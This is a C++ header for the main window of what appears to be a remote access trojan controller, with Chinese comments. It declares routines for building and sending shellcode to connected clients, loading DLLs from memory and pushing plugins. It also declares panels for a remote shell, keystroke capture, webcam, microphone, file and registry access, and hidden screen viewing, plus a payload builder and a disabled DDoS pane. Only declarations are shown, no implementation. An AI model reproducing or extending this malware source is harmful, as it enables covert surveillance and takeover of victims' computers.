// MainFrm.h : interface of the CMainFrame class
#pragma once

#include <map>
#include "MemoryModule.h"
#include "DllToShellCode.h"
#include "SEU_QQwry.h"
#include "TipCtrl.h"
#include "md5.h"

struct PluginsInfo
{
	TCHAR Version[50];
	BYTE* filedate;
	int filesize;
	BOOL bauto;
};

typedef void(__stdcall* fuBoxedAppSDK_SetContext)(LPCSTR szContext);
typedef BOOL(__stdcall* fuBoxedAppSDK_Init)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdkRawData)(PVOID pData, DWORD dwSize);
typedef void(__stdcall* fuBoxedAppSDK_Exit)();
typedef HANDLE(__stdcall* fuBoxedAppSDK_CreateVirtualFileW)(LPCWSTR szPath, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef DWORD(__stdcall* fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableOption)(DWORD dwOptionIndex, BOOL bEnable);
typedef void(__stdcall* fuBoxedAppSDK_RemoteProcess_EnableOption)(DWORD dwProcessId, DWORD dwOptionIndex, BOOL bEnable);
typedef BOOL(__stdcall* fuBoxedAppSDK_AttachToProcess)(HANDLE hProcess);
typedef BOOL(__stdcall* fuBoxedAppSDK_DetachFromProcess)(HANDLE hProcess);
typedef void(__stdcall* fuBoxedAppSDK_EmulateBoxedAppSDKDLL)();
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk64DllPathW)(LPCWSTR szPath);
typedef BOOL(__stdcall* fuBoxedAppSDK_SetBxSdk32DllPathW)(LPCWSTR szPath);
typedef void(__stdcall* fuBoxedAppSDK_EnableDebugLog)(BOOL bEnable);

typedef std::map<CString, PluginsInfo*> PluginsDate; //存放插件数据

class CMainFrame : public CXTPFrameWnd
{
private:
	HMEMORYMODULE handle;
	fuBoxedAppSDK_SetContext MyBoxedAppSDK_SetContext;
	fuBoxedAppSDK_Init MyBoxedAppSDK_Init;
	fuBoxedAppSDK_SetBxSdkRawData MyBoxedAppSDK_SetBxSdkRawData;
	fuBoxedAppSDK_Exit MyBoxedAppSDK_Exit;
	fuBoxedAppSDK_CreateVirtualFileW MyBoxedAppSDK_CreateVirtualFileW;
	fuBoxedAppSDK_DeleteFileFromVirtualFileSystemW MyBoxedAppSDK_DeleteFileFromVirtualFileSystemW;
	fuBoxedAppSDK_EnableOption MyBoxedAppSDK_EnableOption;
	fuBoxedAppSDK_RemoteProcess_EnableOption MyBoxedAppSDK_RemoteProcess_EnableOption;
	fuBoxedAppSDK_AttachToProcess MyBoxedAppSDK_AttachToProcess;
	fuBoxedAppSDK_DetachFromProcess MyBoxedAppSDK_DetachFromProcess;
	fuBoxedAppSDK_EmulateBoxedAppSDKDLL MyBoxedAppSDK_EmulateBoxedAppSDKDLL;
	fuBoxedAppSDK_SetBxSdk64DllPathW MyBoxedAppSDK_SetBxSdk64DllPathW;
	fuBoxedAppSDK_SetBxSdk32DllPathW MyBoxedAppSDK_SetBxSdk32DllPathW;
	fuBoxedAppSDK_EnableDebugLog MyBoxedAppSDK_EnableDebugLog;
	BOOL BoxedAppSDK_Init_IsOK;
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

	// Attributes
public:


	CXTPStatusBar  m_wndStatusBar;

	CXTPStatusBarPane* pPaneW;
	CXTPStatusBarSliderPane* pZoomPaneW;
	int m_nZoom_w;
	CXTPStatusBarPane* pPaneH;
	CXTPStatusBarSliderPane* pZoomPaneH;
	int m_nZoom_h;
	CXTPStatusBarPane* pPaneF;
	CXTPStatusBarSliderPane* pZoomPaneF;
	int m_nZoom_f;

	CCoolTipCtrl m_wndTip; //提示窗口
	SEU_QQwry* m_gQQwry ;

public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);

	static void CALLBACK NotifyProc( ClientContext* pContext, UINT nCode);
	 void ProcessReceiveComplete(ClientContext* pContext);
	 void ProcessReceive(ClientContext* pContext);
	 void ProcessSendShellcode(ClientContext* pContext,int i);
	// Implementation
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif
	
	void FindBestPosition(CXTPPopupControl* pPopup, CSize szPopup);
	BOOL adddCXTPToolBar();//添加工具栏
	CDialogBar* CreatewndFilterEdit();
	
	void showStatusBar(BOOL bshow);
	void OnButton_Monitor_W();
	void OnZoomSliderScroll_W(NMHDR* pNMHDR, LRESULT* pResult);
	void OnButton_Monitor_H();
	void OnZoomSliderScroll_H(NMHDR* pNMHDR, LRESULT* pResult);
	void OnButton_Monitor_F();
	void OnZoomSliderScroll_F(NMHDR* pNMHDR, LRESULT* pResult);



	void Activate();
	void initializeSEU_QQwry(); //初始化IP定位SDK
	void InitShellcode(); //初始化shellcode32
	void WriteResource(bool iswin64,TCHAR* lp_path, TCHAR* lp_filename, int lpszType, TCHAR* lpresname,bool bwrite, bool buildshellcode=false, char* param="0");//写出资源文件到虚拟目录
	void WriteandReadPlugins();//写出插件
	void GetPluginVersion(TCHAR* dllname,TCHAR* Version, SENDTASK sendtask,BOOL bisx86); //获取插件版本
	void ShowConnects();//显示连接数量
	void OnOpenDesktop(ClientContext* pContext);						//显示截图
	void OnOpenSendVersion(ClientContext* pContext);					//发送版本
	void OnOpenSendDll(ClientContext* pContext);						//发送插件
	void SendAutoDll(ClientContext* pContext);						//发送只需要加载的DLL
protected:  // control bar embedded members
	
	
 	CXTPDockingPaneManager m_paneManager;
	CXTPDockingPane* pwndPanelist;
	CXTPDockingPane* pwndPanemonitor;
	CXTPDockingPane* pwndPaneLog;
	CXTPDockingPane* pwndPanePlug;
	CXTPDockingPane* pwndPaneBuild;
	//CXTPDockingPane* pwndPaneChart;
	//CXTPDockingPane* pwndPaneDDOS;
	CMap<UINT, UINT, CWnd*, CWnd*> m_mapPanes;
	SIZE m_sizePopup;
	CPoint m_ptPopup;
	CList<CXTPPopupControl*, CXTPPopupControl*> m_lstPopupControl;


	CXTPTrayIcon m_TrayIcon; //右下角任务管理蓝图标 提示等
	TCHAR m_key[30]; //热键
	PluginsDate m_PluginsDate_x86;  //插件数据
	PluginsDate m_PluginsDate_x64;  //插件数据
	int bAddListen;				//判断监听是否成功
	PVOID Shellcode32;
	int ShellcodeSize32;
	PVOID Shellcode64;
	int ShellcodeSize64;
	HANDLE	hFile; //QQwry
	bool bbusy;
	
// Generated message map functions
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnClose();
	afx_msg void OnMenuitemShow();
	afx_msg void OnLockButton();
	afx_msg void OnHiddenButton();

	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);   //系统菜单消息
	afx_msg LRESULT OnOpenDestopPopup(WPARAM wParam, LPARAM lParam);//弹窗管理
	afx_msg LRESULT OnPopUpNotify(WPARAM wParam, LPARAM lParam);//弹出窗口的消息
	afx_msg LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);
	DECLARE_MESSAGE_MAP()


protected:

	afx_msg LRESULT OnOpenshelldialog(WPARAM wParam, LPARAM lParam);						//终端管理
	afx_msg LRESULT OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam);						//键盘
	afx_msg LRESULT OnOpenregeditdialog(WPARAM wParam, LPARAM lParam);						//注册表
	afx_msg LRESULT OnOpenproxydialog(WPARAM wParam, LPARAM lParam);						//代理
	afx_msg LRESULT OnOpenchatdialog(WPARAM wParam, LPARAM lParam);							//远程交谈
	afx_msg LRESULT OnOpenaudiodialog(WPARAM wParam, LPARAM lParam);						//麦克风
	afx_msg LRESULT OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam);						//文件管理
	afx_msg LRESULT OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam);						//摄像头
	afx_msg LRESULT OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam);						//扬声器
	afx_msg LRESULT OnOpensysinfodialog(WPARAM wParam, LPARAM lParam);						//主机管理
	afx_msg LRESULT OnOpenkerneldialog(WPARAM wParam, LPARAM lParam);						//驱动插件
	afx_msg LRESULT OnOpenexpanddialog(WPARAM wParam, LPARAM lParam);						//互动插件
	afx_msg LRESULT OnOpencreenspydialog_dif(WPARAM wParam, LPARAM lParam);					//差异屏幕
	afx_msg LRESULT OnOpencreenspydialog_quick(WPARAM wParam, LPARAM lParam);				//高速屏幕
	afx_msg LRESULT OnOpencreenspydialog_play(WPARAM wParam, LPARAM lParam);				//娱乐屏幕
	afx_msg LRESULT OnOpencreenspydialog_hide(WPARAM wParam, LPARAM lParam);				//后台屏幕




};

